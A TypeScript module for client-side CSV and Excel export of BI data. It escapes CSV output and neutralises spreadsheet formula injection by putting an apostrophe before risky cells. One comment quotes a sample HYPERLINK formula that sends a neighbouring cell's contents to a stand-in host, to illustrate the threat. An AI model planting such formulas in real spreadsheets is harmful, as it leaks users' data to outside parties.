// Shared client-side data export for the BI/data surfaces: CSV (always
// available, dependency-free) and Excel .xlsx (lazy-loaded so the writer's
// bundle only downloads when a user actually exports to Excel).
//
// Both run entirely in the browser — no server round-trip, no new secrets.
import type { Cell, SheetData } from "write-excel-file/browser";

import type { BiColumnFormat } from "@/lib/biAgent";

/**
 * A value a spreadsheet would execute rather than display.
 *
 * Excel, LibreOffice and Google Sheets treat a leading `=`, `+`, `-`, `@`, tab
 * or carriage return as the start of a FORMULA (CWE-1236). RFC-4180 quoting
 * does not help: the quotes are consumed by the CSV parser and the cell is
 * still a formula.
 *
 * This matters here because rows are not all typed by the person exporting
 * them — they arrive from SaaS connector syncs (Stripe, Shopify, HubSpot,
 * Salesforce), from datasets shared by another tenant, and from warehouse
 * queries. A cell reading `=HYPERLINK("https://x/?d="&A1,"Open")` exfiltrates
 * the row next to it when an analyst opens the export and clicks; Sheets runs
 * `=IMPORTXML(...)` with no click at all.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** A value that only LOOKS like a formula because negative numbers start "-". */
const PLAIN_NUMBER = /^[-+]?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$/;

/**
 * RFC-4180-style CSV escaping (quote when the value has a comma/quote/newline),
 * plus a leading apostrophe on anything a spreadsheet would run as a formula.
 *
 * The apostrophe is the standard neutraliser: spreadsheets strip it on display
 * and treat the rest as text. Numbers are exempt so `-5` stays `-5` — guarding
 * them would corrupt every negative figure in an export.
 */
function csvEscape(v: unknown): string {
  const s = v === null || v === undefined ? "" : String(v);
  const safe = FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s) ? `'${s}` : s;
  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/** Exported for the tests that pin the injection guard. */
export const __csvEscape = csvEscape;

function triggerDownload(blob: Blob, filename: string): void {
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
  URL.revokeObjectURL(a.href);
}

/** Append an extension only when it isn't already present (case-insensitive). */
function withExt(name: string, ext: string): string {
  const base = (name || "export").trim() || "export";
  return base.toLowerCase().endsWith(`.${ext}`) ? base : `${base}.${ext}`;
}

/** Download the given columns/rows as a UTF-8 CSV (BOM for Excel compatibility). */
export function downloadCsv(
  columns: string[],
  rows: Record<string, unknown>[],
  filename: string,
): void {
  const lines = [
    columns.map(csvEscape).join(","),
    ...rows.map((r) => columns.map((c) => csvEscape(r[c])).join(",")),
  ];
  // Leading BOM so Excel opens UTF-8 CSVs with the right encoding.
  const blob = new Blob(["﻿" + lines.join("\r\n")], {
    type: "text/csv;charset=utf-8",
  });
  triggerDownload(blob, withExt(filename, "csv"));
}

const CURRENCY_SYMBOLS: Record<string, string> = {
  USD: "$",
  EUR: "€",
  GBP: "£",
  JPY: "¥",
  CNY: "¥",
  INR: "₹",
  AUD: "$",
  CAD: "$",
  CHF: "CHF ",
  BRL: "R$",
  ZAR: "R",
};

/**
 * Excel number-format string from our BiColumnFormat. Best effort and
 * intentionally conservative:
 *  - percent uses a LITERAL "%" (quoted) — our percent values are already in
 *    percent units (12.3 → "12.3%"), so Excel's real % operator would wrongly
 *    multiply by 100.
 *  - currency prefixes a known symbol (else no symbol) to avoid showing a
 *    wrong currency.
 */
function excelNumberFormat(fmt?: BiColumnFormat): string | undefined {
  if (!fmt || !fmt.format) return undefined;
  const d =
    typeof fmt.decimals === "number" && Number.isFinite(fmt.decimals)
      ? Math.min(4, Math.max(0, Math.round(fmt.decimals)))
      : undefined;
  const frac = (fallback: string) =>
    d === undefined ? fallback : d === 0 ? "" : `.${"0".repeat(d)}`;
  if (fmt.format === "currency") {
    const sym = CURRENCY_SYMBOLS[(fmt.currency || "USD").toUpperCase()] ?? "";
    const q = sym ? `"${sym}"` : "";
    return `${q}#,##0${frac(".00")}`;
  }
  if (fmt.format === "percent") return `#,##0${frac(".0")}"%"`;
  if (fmt.format === "number") return `#,##0${frac("")}`;
  return undefined;
}

/** One xlsx cell from a raw value (+ optional number format for numerics). */
function toXlsxCell(v: unknown, numFormat?: string): Cell {
  if (v === null || v === undefined) return null;
  if (typeof v === "number") {
    return Number.isFinite(v)
      ? { type: Number, value: v, ...(numFormat ? { format: numFormat } : {}) }
      : { type: String, value: String(v) };
  }
  if (typeof v === "boolean") return { type: Boolean, value: v };
  if (v instanceof Date) return { type: Date, value: v, format: "yyyy-mm-dd" };
  return { type: String, value: String(v) };
}

/**
 * Download the given columns/rows as a real .xlsx. The writer is imported
 * lazily so it never enters the main bundle. `columnFormats` (from the BI
 * builder) are applied as Excel number formats where present.
 */
export async function downloadXlsx(
  columns: string[],
  rows: Record<string, unknown>[],
  filename: string,
  opts?: { sheet?: string; columnFormats?: Record<string, BiColumnFormat> },
): Promise<void> {
  const writeXlsxFile = (await import("write-excel-file/browser")).default;
  const header: Cell[] = columns.map((c) => ({
    type: String,
    value: c,
    fontWeight: "bold",
  }));
  const body: Cell[][] = rows.map((r) =>
    columns.map((c) => toXlsxCell(r[c], excelNumberFormat(opts?.columnFormats?.[c]))),
  );
  const data: SheetData = [header, ...body];
  // Excel sheet names are capped at 31 chars and forbid a few characters.
  const sheet = (opts?.sheet ?? "Sheet1").replace(/[\\/?*[\]:]/g, " ").slice(0, 31) || "Sheet1";
  await writeXlsxFile(data, { sheet }).toFile(withExt(filename, "xlsx"));
}
